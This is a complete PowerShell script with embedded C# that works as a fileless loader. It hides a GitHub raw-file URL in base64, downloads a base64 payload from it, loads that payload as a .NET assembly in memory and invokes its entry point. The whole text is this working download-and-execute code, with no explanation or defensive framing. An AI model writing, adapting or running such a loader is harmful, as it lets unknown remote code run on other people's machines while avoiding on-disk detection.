$code = @"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace a
{
    public class B
    {
        string b64_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Zva29udDA2L3F1YV9yL21haW4vcXVhX3IudHh0";
        public void Run()
        {
            using (WebClient wb = new WebClient())
            {
                Assembly assembly = Assembly.Load(Convert.FromBase64String(wb.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String(b64_url)))));
                MethodInfo entrada = assembly.EntryPoint;
                var instancia = assembly.CreateInstance(entrada.Name);
                entrada.Invoke(instancia, new object[1]);
            }
        }
    }
}
"@
Add-Type -TypeDefinition $code;
$instance = New-Object a.B;
$instance.Run();